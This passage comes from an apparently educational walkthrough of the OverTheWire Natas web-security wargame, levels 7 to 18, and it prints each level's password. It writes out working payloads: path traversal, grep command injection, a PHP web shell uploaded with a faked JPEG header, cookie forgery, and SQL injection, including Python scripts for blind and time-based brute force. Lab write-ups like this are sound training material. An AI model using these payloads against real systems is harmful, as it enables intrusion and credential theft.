<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->


<p>```</p>

<p>Going to the Home and About pages, nothing interesting jumps out. However, combining the hint with how the URL looks like, I thought about local file inclusion. The normal URL is <a href="http://natas7.natas.labs.overthewire.org/index.php?page=home">http://natas7.natas.labs.overthewire.org/index.php?page=home</a> and I tried to read the password file by changing it to <a href="http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8">http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8</a> . And it worked! The password is <code>DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</code></p>

<h3>Level 8</h3>

<p><img class="center" src="/images/overthewire/natas/natas6.png" title="&lsquo;natas8&rsquo; &lsquo;natas 8&rsquo;" ></p>

<p>We have to look at PHP source code again:</p>

<p>``` php
&lt;?</p>

<p>$encodedSecret = &ldquo;3d3d516343746d4d6d6c315669563362&rdquo;;</p>

<p>function encodeSecret($secret) {</p>

<pre><code>return bin2hex(strrev(base64_encode($secret)));
</code></pre>

<p>}</p>

<p>if(array_key_exists(&ldquo;submit&rdquo;, $_POST)) {</p>

<pre><code>if(encodeSecret($_POST['secret']) == $encodedSecret) {
print "Access granted. The password for natas9 is &lt;censored&gt;";
} else {
print "Wrong secret";
}
</code></pre>

<p>}
?>
```</p>

<p>So it&rsquo;s looking for a string that matches the end result of all these conversions. Instead, we can reverse the process and decrypt the encoded secret to its original value.</p>

<p>``` plain</p>

<h1>hex to binary</h1>

<p>3d3d516343746d4d6d6c315669563362 becomes 00111101 00111101 01010001 01100011 01000011 01110100 01101101 01001101 01101101 01101100 00110001 01010110 01101001 01010110 00110011 01100010</p>

<h1>binary to ascii</h1>

<p>00111101 00111101 01010001 01100011 01000011 01110100 01101101 01001101 01101101 01101100 00110001 01010110 01101001 01010110 00110011 01100010  becomes ==QcCtmMml1ViV3b</p>

<h1>reverse</h1>

<p>==QcCtmMml1ViV3b becomes b3ViV1lmMmtCcQ==</p>

<h1>final base64 decode</h1>

<p>b3ViV1lmMmtCcQ== becomes oubWYf2kBq
```</p>

<p>Input <code>oubWYf2kBq</code> in the form and you will get <code>Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</code></p>

<h3>Level 9</h3>

<p><img class="center" src="/images/overthewire/natas/natas9.png" title="&lsquo;natas9&rsquo; &lsquo;natas 9&rsquo;" ></p>

<p>If you enter something, the backend greps for that word in a dictionary file:</p>

<p>``` php
&lt;?
$key = &ldquo;&rdquo;;</p>

<p>if(array_key_exists(&ldquo;needle&rdquo;, $_REQUEST)) {</p>

<pre><code>$key = $_REQUEST["needle"];
</code></pre>

<p>}</p>

<p>if($key != &ldquo;&rdquo;) {</p>

<pre><code>passthru("grep -i $key dictionary.txt");
</code></pre>

<p>}
?>
```</p>

<p>So I thought to terminate the first command and chain another one, that would read the password: <code>; cat /etc/natas_webpass/natas10</code>. And the password is output, along with the entire file: <code>nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</code></p>

<h3>Level 10</h3>

<p><img class="center" src="/images/overthewire/natas/natas10.png" title="&lsquo;natas10&rsquo; &lsquo;natas 10&rsquo;" ></p>

<p>This level is the same as the last, except now there is some filtering in place:</p>

<p>``` php
&lt;?
$key = &ldquo;&rdquo;;</p>

<p>if(array_key_exists(&ldquo;needle&rdquo;, $_REQUEST)) {</p>

<pre><code>$key = $_REQUEST["needle"];
</code></pre>

<p>}</p>

<p>if($key != &ldquo;&rdquo;) {</p>

<pre><code>if(preg_match('/[;|&amp;]/',$key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i $key dictionary.txt");
}
</code></pre>

<p>}
?>
```</p>

<p>This filtering doesn&rsquo;t exclude all characters that could be useful. If you read the <em>grep</em> manpage, you will come across this section:</p>

<blockquote><p>Anchoring
The caret ^ and the dollar sign $ are meta-characters that respectively  match the empty string at the beginning and end of a line.</p></blockquote>

<p>So I went ahead and tried <code>^ cat /etc/natas_webpass/natas11</code>, and the password was output, along with the rest of the file. This worked because <em>grep</em> returned every line containing the string that matches the beginning of the line (or end if you use $). I just added the password file for <em>grep</em> to read</p>

<p><code>plain
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
dictionary.txt:
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
dictionary.txt:Allah's
dictionary.txt:American
dictionary.txt:Americanism
dictionary.txt:Americanism's
dictionary.txt:Americanisms
dictionary.txt:Americans
...
</code></p>

<h3>Level 11</h3>

<p><img class="center" src="/images/overthewire/natas/natas11.png" title="&lsquo;natas11&rsquo; &lsquo;natas 11&rsquo;" ></p>

<p>The backend code is more complicated:</p>

<p>``` php
&lt;?</p>

<p>$defaultdata = array( &ldquo;showpassword&rdquo;=>&ldquo;no&rdquo;, &ldquo;bgcolor&rdquo;=>&ldquo;#ffffff&rdquo;);</p>

<p>function xor_encrypt($in) {</p>

<pre><code>$key = '&lt;censored&gt;';
$text = $in;
$outText = '';

// Iterate through each character
for($i=0;$i&lt;strlen($text);$i++) {
$outText .= $text[$i] ^ $key[$i % strlen($key)];
}

return $outText;
</code></pre>

<p>}</p>

<p>function loadData($def) {</p>

<pre><code>global $_COOKIE;
$mydata = $def;
if(array_key_exists("data", $_COOKIE)) {
$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
if(is_array($tempdata) &amp;&amp; array_key_exists("showpassword", $tempdata) &amp;&amp; array_key_exists("bgcolor", $tempdata)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
    $mydata['showpassword'] = $tempdata['showpassword'];
    $mydata['bgcolor'] = $tempdata['bgcolor'];
    }
}
}
return $mydata;
</code></pre>

<p>}</p>

<p>function saveData($d) {</p>

<pre><code>setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
</code></pre>

<p>}</p>

<p>$data = loadData($defaultdata);</p>

<p>if(array_key_exists(&ldquo;bgcolor&rdquo;,$_REQUEST)) {</p>

<pre><code>if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
    $data['bgcolor'] = $_REQUEST['bgcolor'];
}
</code></pre>

<p>}</p>

<p>saveData($data);
?></p>

<p>&lt;?
if($data[&ldquo;showpassword&rdquo;] == &ldquo;yes&rdquo;) {</p>

<pre><code>print "The password for natas12 is &lt;censored&gt;&lt;br&gt;";
</code></pre>

<p>}</p>

<p>?>
```</p>

<p>Well, looking at the page, we see a <em>data</em> cookie that&rsquo;s base64 encoded, but decoding it gives rubbish because it&rsquo;s XOR encrypted. The PHP code operates on it. We can also set the background color by giving it a valid value.</p>

<p>Now for the code! Breaking it down:</p>

<ul>
<li><p>The default data is an array comprised of the values <em>showpassword</em> set to no and <em>bgcolor</em> set to #ffffff</p></li>
<li><p>The xor_encrypt function performs XOR encryption on the given input</p></li>
<li><p>The loadData function loads the data from the cookie, or keeps the default values if the data is invalid.</p></li>
<li><p>The saveData function sets the cookie&rsquo;s value by the process of  <code>JSON encode &ndash;> XOR encrypt &ndash;> base64 encode</code></p></li>
</ul>


<p>At the end, we can see that if <em>showpassword</em> is set to yes, the password for the next level will be displayed. To achieve this, we have to mirror the cookie creation process, and change that value accordingly. But we don&rsquo;t have the key used for the XOR encryption. However, we know that in XOR encryption, <code>original xor key = encrypted</code>, and the following also applies: <code>original xor encrypted = key</code>. Because we have both the original data and the encrypted version, we can recover the key!</p>

<p>I kept the original code since it does all the work, and only made some modifications to the variables:</p>

<p>``` php
// the value of the cookie after base64 decoding
$original = base64_decode(&lsquo;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&rsquo;);</p>

<p>function xor_encrypt($in) {</p>

<pre><code>$defaultdata = array( "showpassword"=&gt;"no", "bgcolor"=&gt;"#ffffff");
// the json encoded version of the default data
$key = json_encode($defaultdata);
$text = $in;
$outText = '';

// Iterate through each character
for($i=0;$i&lt;strlen($text);$i++) {
$outText .= $text[$i] ^ $key[$i % strlen($key)];
}

return $outText;
</code></pre>

<p>}</p>

<p>print xor_encrypt($original);
```</p>

<p>Ran this through the PHP sandbox at <a href="http://sandbox.onlinephpfunctions.com/">http://sandbox.onlinephpfunctions.com/</a> and the result was the string <code>qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq</code>. The string <em>qw8J</em> gets repeated, this is the key! Now we can reuse the code to create a cookie encrypted with this key, and with <em>showpassword</em> set to yes:</p>

<p>``` php
$defaultdata = array( &ldquo;showpassword&rdquo;=>&ldquo;yes&rdquo;, &ldquo;bgcolor&rdquo;=>&ldquo;#ffffff&rdquo;);
$json_data = json_encode($defaultdata);</p>

<p>function xor_encrypt($in) {</p>

<pre><code>$key = 'qw8J';
$text = $in;
$outText = '';

// Iterate through each character
for($i=0;$i&lt;strlen($text);$i++) {
$outText .= $text[$i] ^ $key[$i % strlen($key)];
}

return base64_encode($outText);
</code></pre>

<p>}</p>

<p>print xor_encrypt($json_data);
```</p>

<p>Running this code gives a new cookie value: <code>ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK</code>. Replace the cookie value in the page and you will get the next password: <code>The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</code></p>

<h3>Level 12</h3>

<p><img class="center" src="/images/overthewire/natas/natas12.png" title="&lsquo;natas12&rsquo; &lsquo;natas 12&rsquo;" ></p>

<p>For this mission it seems we can upload a file to the server.</p>

<p>``` php
&lt;?</p>

<p>function genRandomString() {</p>

<pre><code>$length = 10;
$characters = "0123456789abcdefghijklmnopqrstuvwxyz";
$string = "";    

for ($p = 0; $p &lt; $length; $p++) {
    $string .= $characters[mt_rand(0, strlen($characters)-1)];
}

return $string;
</code></pre>

<p>}</p>

<p>function makeRandomPath($dir, $ext) {</p>

<pre><code>do {
$path = $dir."/".genRandomString().".".$ext;
} while(file_exists($path));
return $path;
</code></pre>

<p>}</p>

<p>function makeRandomPathFromFilename($dir, $fn) {</p>

<pre><code>$ext = pathinfo($fn, PATHINFO_EXTENSION);
return makeRandomPath($dir, $ext);
</code></pre>

<p>}</p>

<p>if(array_key_exists(&ldquo;filename&rdquo;, $_POST)) {</p>

<pre><code>$target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


    if(filesize($_FILES['uploadedfile']['tmp_name']) &gt; 1000) {
    echo "File is too big";
} else {
    if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
        echo "The file &lt;a href=\"$target_path\"&gt;$target_path&lt;/a&gt; has been uploaded";
    } else{
        echo "There was an error uploading the file, please try again!";
    }
}
</code></pre>

<p>} else {
?>
```</p>

<p>The code tests if the file satisfies the constraints and uploads it with a new name that&rsquo;s randomly generated. Then it gives you the link where you can find it:</p>

<p><img class="center" src="/images/overthewire/natas/upload.png" title="&lsquo;upload&rsquo; &lsquo;upload&rsquo;" ></p>

<p>So I tried uploading a PHP file that would read the password for the next level:</p>

<p><code>plain
root@kali:~/Desktop# cat pass.php
&lt;?
echo(exec('cat /etc/natas_webpass/natas13'));
?&gt;
</code></p>

<p>But the extension is changed to a jpg, so the code doesn&rsquo;t get executed. Further in the HTML there is this line:</p>

<p><code>html
&lt;input type="hidden" name="filename" value="&lt;? print genRandomString(); ?&gt;.jpg" /&gt;
</code></p>

<p>I used Firebug to change the jpg extension to a php one and re-uploaded the file and this time it worked: <code>The file upload/g72k7zidu8.php has been uploaded</code>. Next I followed the link and inside was the password: <code>jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</code></p>

<h3>Level 13</h3>

<p><img class="center" src="/images/overthewire/natas/natas13.png" title="&lsquo;natas13&rsquo; &lsquo;natas 13&rsquo;" ></p>

<p>Ok, this time they made a modification so that only jpg files can be uploaded..or so they claim. The code is the same as the last challenge, except for a new check:</p>

<p>``` php
else if (! exif_imagetype($_FILES[&lsquo;uploadedfile&rsquo;][&lsquo;tmp_name&rsquo;])) {</p>

<pre><code>    echo "File is not an image";
</code></pre>

<p>```</p>

<p><strong>exif_imagetype()</strong> reads the first bytes of an image and checks its signature. If the signature is invalid, it returns False.</p>

<p>This type of check can be fooled by providing the specific magic number for the file in question. The signature for jpg files is the hex value 0xFFD8FFE0</p>

<p><code>plain
root@kali:~/Desktop# echo -e '\xFF\xD8\xFF\xE0' &gt; pass.php
root@kali:~/Desktop# echo "&lt;?echo(exec('cat /etc/natas_webpass/natas13'));?&gt;" &gt;&gt; pass.php
</code></p>

<p>The upload process is the same (don&rsquo;t forget to modify the extension with Firebug or other tools). Then I went to the link and the password is  <code>Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</code>. If you notice the weird looking characters ÿØÿà before it, it&rsquo;s because the text representation of the jpg magic number is also echoed back. The password starts after that</p>

<h3>Level 14</h3>

<p><img class="center" src="/images/overthewire/natas/natas14.png" title="&lsquo;natas14&rsquo; &lsquo;natas 14&rsquo;" ></p>

<p>Looking at the code hints at what type of vulnerability can be exploited:</p>

<p>``` php
&lt;?
if(array_key_exists(&ldquo;username&rdquo;, $_REQUEST)) {</p>

<pre><code>$link = mysql_connect('localhost', 'natas14', '&lt;censored&gt;');
mysql_select_db('natas14', $link);

$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
if(array_key_exists("debug", $_GET)) {
    echo "Executing query: $query&lt;br&gt;";
}

if(mysql_num_rows(mysql_query($query, $link)) &gt; 0) {
        echo "Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;";
} else {
        echo "Access denied!&lt;br&gt;";
}
mysql_close($link);
</code></pre>

<p>} else {
?>
```</p>

<p>No input sanitization = SQL injection! Moreover, we can get additional information by setting debug to True in the URL. For that, I also included the username and password fields in the URL: <a href="http://natas14.natas.labs.overthewire.org/index.php?debug=True&amp;username=test&amp;password=pass">http://natas14.natas.labs.overthewire.org/index.php?debug=True&amp;username=test&amp;password=pass</a></p>

<p>And now there was a message showing the query that was run on the backend:</p>

<p><code>plain
 Executing query: SELECT * from users where username="test" and password="pass"
Access denied!
</code></p>

<p>After seeing how the query looks like, I used the following injection string to fool the database:</p>

<p>username = can be anything</p>

<p>password = <code>pass" or 1=1&mdash; </code></p>

<p>To see why this works, look at the query now:</p>

<p><code>sql
Executing query: SELECT * from users where username="test" and password="pass" or 1=1-- "
</code></p>

<p>By fixing the quotes we forced the database to evaluate an always true condition (1=1) and bypass the credentials check. The <code>&mdash; </code> comments out the rest of the query which would otherwise break our injection. If you inject in the URL, don&rsquo;t forget that you need to URL encode the space (%20)</p>

<p>After the SQL injection, you will see this: <code>Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</code></p>

<h3>Level 15</h3>

<p><img class="center" src="/images/overthewire/natas/natas15.png" title="&lsquo;natas15&rsquo; &lsquo;natas 15&rsquo;" ></p>

<p>This time you can check if a username exists or not. Let&rsquo;s look at the code:</p>

<p>``` php
&lt;?</p>

<p>/<em>
CREATE TABLE <code>users</code> (
  <code>username</code> varchar(64) DEFAULT NULL,
  <code>password</code> varchar(64) DEFAULT NULL
);
</em>/</p>

<p>if(array_key_exists(&ldquo;username&rdquo;, $_REQUEST)) {</p>

<pre><code>$link = mysql_connect('localhost', 'natas15', '&lt;censored&gt;');
mysql_select_db('natas15', $link);

$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
if(array_key_exists("debug", $_GET)) {
    echo "Executing query: $query&lt;br&gt;";
}

$res = mysql_query($query, $link);
if($res) {
if(mysql_num_rows($res) &gt; 0) {
    echo "This user exists.&lt;br&gt;";
} else {
    echo "This user doesn't exist.&lt;br&gt;";
}
} else {
    echo "Error in query.&lt;br&gt;";
}

mysql_close($link);
</code></pre>

<p>} else {
?>
```</p>

<p>We can again see the query that is being run on the backend by manipulating the URL: <a href="http://natas15.natas.labs.overthewire.org/index.php?debug=True&amp;username=natas16">http://natas15.natas.labs.overthewire.org/index.php?debug=True&amp;username=natas16</a></p>

<p><code>plain
Executing query: SELECT * from users where username="natas16"
This user exists.
</code></p>

<p>So, this time the SQL code checks for the existence of a user and reports whether that username exists or not. We can&rsquo;t inject in a way that would directly give us the password like previously, but we know the query will be run against the <em>users</em> table, which contains both usernames and passwords. There is a way to bruteforce the natas16 password by forcing the database to check it one character at a time and report True of False (user exists or not). The statement to inject will look like this: <code>username=natas16" AND password LIKE BINARY &ldquo;a%&rdquo;&mdash; </code>. Testing it in the URL (don&rsquo;t forget to encode the space after comments), you can check one character a time until the database respons with the user exists message. Then you know the password begins with the respective character and you can move on to the next. But the password is 32 characters long, so we will do it in an automated way!</p>

<p>Some explanation about the SQL keywords:</p>

<ul>
<li><p>The AND operator displays a record if both the first condition AND the second condition are true.</p></li>
<li><p>The LIKE operator is used in a WHERE clause to search for a specified pattern in a column.</p></li>
<li><p>The BINARY operator casts the string following it to a binary string. This is an easy way to force a column comparison to be done byte by byte rather than character by character. This causes the comparison to be case sensitive even if the column is not defined as BINARY or BLOB. BINARY also causes trailing spaces to be significant.</p></li>
<li><p><strong>%</strong>     A substitute for zero or more characters</p></li>
</ul>


<p>If you run this query with the debug parameter set, you will see how it looks like:</p>

<p><code>plain
Executing query: SELECT * from users where username="natas16"and password like binary "a%"-- "
</code></p>

<p>When the entire statement is evaluated, the query will return True of False, and we will use that information to build the password. Here&rsquo;s a Python script to do the job:</p>

<p>``` python
import requests</p>

<p>passwd = &ldquo;&rdquo;</p>

<h1>this is the range of possible values</h1>

<p>testchars = &ldquo;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&rdquo;
index = 0
while index &lt; len(testchars):</p>

<pre><code># binary keyword forces a case sensitive search
query = dict(username="natas16\" AND password like BINARY \"" + \
             passwd + testchars[index] + "%\" -- ",submit="Check existence")
# example query: {'username': 'natas16" AND password like BINARY " a%" -- '}
guess = requests.post('http://natas15.natas.labs.overthewire.org/', \
                  auth = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'),\
                  params = query)
# example encoded query (automatic encoding):
# username=natas16%22+AND+password+like+BINARY+%22+a%25%22+--+
if "This user exists" in guess.text:

    passwd += testchars[index]
    print passwd
    index = 0
    continue
index += 1
</code></pre>

<p>```</p>

<p>The passwod will be slowly built like this:</p>

<p><code>plain
W
Wa
WaI
WaIH
WaIHE
WaIHEa
WaIHEac
WaIHEacj
WaIHEacj6
WaIHEacj63
WaIHEacj63w
WaIHEacj63wn
WaIHEacj63wnN
WaIHEacj63wnNI
WaIHEacj63wnNIB
WaIHEacj63wnNIBR
WaIHEacj63wnNIBRO
WaIHEacj63wnNIBROH
WaIHEacj63wnNIBROHe
WaIHEacj63wnNIBROHeq
WaIHEacj63wnNIBROHeqi
WaIHEacj63wnNIBROHeqi3
WaIHEacj63wnNIBROHeqi3p
WaIHEacj63wnNIBROHeqi3p9
WaIHEacj63wnNIBROHeqi3p9t
WaIHEacj63wnNIBROHeqi3p9t0
WaIHEacj63wnNIBROHeqi3p9t0m
WaIHEacj63wnNIBROHeqi3p9t0m5
WaIHEacj63wnNIBROHeqi3p9t0m5n
WaIHEacj63wnNIBROHeqi3p9t0m5nh
WaIHEacj63wnNIBROHeqi3p9t0m5nhm
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
</code></p>

<p>And now we have the password for natas16: <code>WaIHEacj63wnNIBROHeqi3p9t0m5nhmh</code></p>

<h3>Level 16</h3>

<p><img class="center" src="/images/overthewire/natas/natas16.png" title="&lsquo;natas16&rsquo; &lsquo;natas 16&rsquo;" ></p>

<p>``` php
&lt;?
$key = &ldquo;&rdquo;;</p>

<p>if(array_key_exists(&ldquo;needle&rdquo;, $_REQUEST)) {</p>

<pre><code>$key = $_REQUEST["needle"];
</code></pre>

<p>}</p>

<p>if($key != &ldquo;&rdquo;) {</p>

<pre><code>if(preg_match('/[;|&amp;`\'"]/',$key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i \"$key\" dictionary.txt");
}
</code></pre>

<p>}
?>
```</p>

<p>Right, this is similar to level 9. This time, however, there is character filtering in place, so we can&rsquo;t use any of these: <code>;|&amp;`\&lsquo;&ldquo;</code>. So there is no way to inject or chain commands..at the first glance! There is one useful character that is not filtered! The dollar sign! This is used in the bash shell in the same way as the backticks: for <a href="http://bash.cyberciti.biz/guide/Command_substitution">command substitution</a></p>

<p>Basically, you can use it to run a command and store its output in a variable or display it with the <em>echo</em> command. It looks like this:</p>

<p><code>plain
root@kali:~# echo $(whoami)
root
</code></p>

<p>So we want to bruteforce the password in the way we did before. Whatever we run with the $() command will be placed inside the $key variable, which is passed to grep against the dictionary file. If there is a match, the words containing it are displayed, else nothing is displayed. This is the behavior we will exploit for True and False values with our injection</p>

<p>Let&rsquo;s test it first. In the form field, I injected <code>$(echo matrix)</code>, and that return all the matches for that word:</p>

<p>``` plain
Output:</p>

<p>matrix
matrix&rsquo;s
matrixes
```</p>

<p>The code executed by the server ends up being <code>grep -i matrix dictionary.txt</code>. Now, if I inject a non-existent word, there is no output. So to check for the password, we will use a nested grep inside the main grep, that will look like this: <code>$(grep -E ^a.* /etc/natas_webpass/natas17)matrix</code>. This checks if the password starts with a, and we will then iterate over all characters. Let&rsquo;s imagine what happens if a is the first character of the password:</p>

<ul>
<li><p>the nested grep that we injected returns a, which is appended to the word we passed after, matrix in this case, so the server-side grep looks for the word amatrix in the dictionary file, and since that doesn&rsquo;t exist, nothing is returned. So we know that if nothing is returned, we had a match</p></li>
<li><p>there is no match for the nested grep, so the matrix word remains unchanged, and the server returns all the matrix words, which means there was no match for the character we tried in the password</p></li>
</ul>


<p>To automate the injection process, I wrote a Python script again:</p>

<p>``` python</p>

<h1>!/usr/bin/env python</h1>

<p>import requests</p>

<p>testchars = &ldquo;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&rdquo;
index = 0
passwd = &ldquo;&rdquo;</p>

<p>while index != 32:</p>

<pre><code>for char in testchars:
        passwd += char
        payload = {'needle': "$(grep -E ^" + passwd + ".* /etc/natas_webpass/natas17)matrix", 'submit': 'Search'}      
        guess = requests.post('http://natas16.natas.labs.overthewire.org/?needle=',                             
                             auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'),
                             params = payload)                                                        
        response = guess.text
        print "Trying: ", passwd
        if "matrix" not in response:
            print "Password: ", passwd
            index += 1
            break
        else:
            # keep the chars that matched
            passwd = passwd[:-1]
</code></pre>

<p>print &ldquo;Done! Password: &rdquo;, passwd
```</p>

<p>And the output:</p>

<p><code>plain
Password:  8
Password:  8P
Password:  8Ps
Password:  8Ps3
Password:  8Ps3H
Password:  8Ps3H0
Password:  8Ps3H0G
Password:  8Ps3H0GW
Password:  8Ps3H0GWb
Password:  8Ps3H0GWbn
Password:  8Ps3H0GWbn5
Password:  8Ps3H0GWbn5r
Password:  8Ps3H0GWbn5rd
Password:  8Ps3H0GWbn5rd9
Password:  8Ps3H0GWbn5rd9S
Password:  8Ps3H0GWbn5rd9S7
Password:  8Ps3H0GWbn5rd9S7G
Password:  8Ps3H0GWbn5rd9S7Gm
Password:  8Ps3H0GWbn5rd9S7GmA
Password:  8Ps3H0GWbn5rd9S7GmAd
Password:  8Ps3H0GWbn5rd9S7GmAdg
Password:  8Ps3H0GWbn5rd9S7GmAdgQ
Password:  8Ps3H0GWbn5rd9S7GmAdgQN
Password:  8Ps3H0GWbn5rd9S7GmAdgQNd
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdk
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkh
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhP
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPk
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
Done! Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
</code></p>

<p>Cool, we have the password for the next level: <code>8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw</code></p>

<h3>Level 17</h3>

<p><img class="center" src="/images/overthewire/natas/natas15.png" title="&lsquo;natas17&rsquo; &lsquo;natas 17&rsquo;" ></p>

<p>Again, a level similar to a previous one. This will be another case of SQL injection:</p>

<p>``` php
&lt;?</p>

<p>/<em>
CREATE TABLE <code>users</code> (
  <code>username</code> varchar(64) DEFAULT NULL,
  <code>password</code> varchar(64) DEFAULT NULL
);
</em>/</p>

<p>if(array_key_exists(&ldquo;username&rdquo;, $_REQUEST)) {</p>

<pre><code>$link = mysql_connect('localhost', 'natas17', '&lt;censored&gt;');
mysql_select_db('natas17', $link);

$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
if(array_key_exists("debug", $_GET)) {
    echo "Executing query: $query&lt;br&gt;";
}

$res = mysql_query($query, $link);
if($res) {
if(mysql_num_rows($res) &gt; 0) {
    //echo "This user exists.&lt;br&gt;";
} else {
    //echo "This user doesn't exist.&lt;br&gt;";
}
} else {
    //echo "Error in query.&lt;br&gt;";
}

mysql_close($link);
</code></pre>

<p>} else {
?>
```</p>

<p>We know the database is vulnerable, but nothing is displayed to the screen, because the <em>echo</em> statements are commented out. So we&rsquo;re going in blind! To determine if the database returns True or False to our query, we can use time-based SQL injection, by making the database load longer if our query is true, and normal if not. I tested it with this injection string: <code>natas18" AND SLEEP(5)&mdash; </code>. As expected, since the user natas18 exists, the page took 5 seconds to load. When the username didn&rsquo;t exist, it loaded instantly. So the sleep function is executed if the previous part of the query was true, but not if it&rsquo;s false. With this in mind, I modified the Python script I used before:</p>

<p>``` python
import requests</p>

<p>passwd = &ldquo;&rdquo;
testchars = &ldquo;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&rdquo;
index = 0
while index &lt; len(testchars):</p>

<pre><code>query = {'username': 'natas18" and password like binary ' + '"' + passwd + testchars[index] + '%" ' + 'and sleep(15)-- ', 'submit': 'Check existence'}
try:
    guess = requests.post('http://natas17.natas.labs.overthewire.org/', \
                      auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'),\
                      params = query, \
                      timeout=10) # how many seconds to wait for a response
except requests.Timeout:
    passwd += testchars[index]
    print 'Password: ', passwd
    index = 0
    continue
index += 1
</code></pre>

<p>print &lsquo;Done! Password is &rsquo;, passwd
```</p>

<p>This took long because I had to use higher values for sleep() and timeout..the script kept stopping early with shorter times. Anyway, skipping the build-up output, the passwod is <code>xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP</code></p>

<h3>Level 18</h3>

<p><img class="center" src="/images/overthewire/natas/natas18.png" title="&lsquo;natas18&rsquo; &lsquo;natas 18&rsquo;" ></p>

<p>``` php
&lt;?</p>

<p>$maxid = 640; // 640 should be enough for everyone</p>

<p>function isValidAdminLogin() {</p>

<pre><code>if($_REQUEST["username"] == "admin") {
/* This method of authentication appears to be unsafe and has been disabled for now. */
    //return 1;
}

return 0;
</code></pre>

<p>}</p>

<p>function isValidID($id) {</p>

<pre><code>return is_numeric($id);
</code></pre>

<p>}</p>

<p>function createID($user) {</p>

<pre><code>global $maxid;
return rand(1, $maxid);
</code></pre>

<p>}</p>

<p>function debug($msg) {</p>

<pre><code>if(array_key_exists("debug", $_GET)) {
    print "DEBUG: $msg&lt;br&gt;";
}
</code></pre>

<p>}</p>

<p>function my_session_start() {</p>

<pre><code>if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
if(!session_start()) {
    debug("Session start failed");
    return false;
} else {
    debug("Session start ok");
    if(!array_key_exists("admin", $_SESSION)) {
    debug("Session was old: admin flag set");
    $_SESSION["admin"] = 0; // backwards compatible, secure
    }
    return true;
}
}

return false;
</code></pre>

<p>}</p>

<p>function print_credentials() {</p>

<pre><code>if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
print "You are an admin. The credentials for the next level are:&lt;br&gt;";
print "&lt;pre&gt;Username: natas19\n";
print "Password: &lt;censored&gt;&lt;/pre&gt;";
} else {
print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
}
</code></pre>

<p>}</p>

<p>$showform = true;
if(my_session_start()) {</p>

<pre><code>print_credentials();
$showform = false;
</code></pre>

<p>} else {</p>

<pre><code>if(array_key_exists("username", $_REQUEST) &amp;&amp; array_key_exists("password", $_REQUEST)) {
session_id(createID($_REQUEST["username"]));
session_start();
$_SESSION["admin"] = isValidAdminLogin();
debug("New session started");
$showform = false;
print_credentials();
}
</code></pre>

<p>}</p>

<p>?>
```</p>

<p>This is a lot of code, but first let&rsquo;s see its behavior. When you enter something in the form, a random PHPSESSID between 1 and 640 is created. Then you see the message that you are logged in as a regular user. If you turn debug on and try tampering with the cookie, you will see the message that the session was old and the admin flag was set. The objective appears to be to log in with an admin session ID, and then the credentials for the next level will be printed to the screen. The first time I looked over the code and noticed the fact that the $maxid can be predicted and bruteforced, I thought that&rsquo;s the way to go, but first to understand the code:</p>

<ul>
<li><p>the $maxid holds the maximum value of a PHPSESSID &ndash;> 640</p></li>
<li><p>isValidAdminLogin() just returns 0, so whenever it&rsquo;s called it will set the admin session ID to 0 (not what we want)</p></li>
<li><p>isValidID($id) returns True if the ID is a valid number or numeric string, False otherwise</p></li>
<li><p>createID($user) this is the function that creates the PHPSESSID, with a random value between 1 and 640 (predictable and not long to bruteforce, not what we want in a session ID)</p></li>
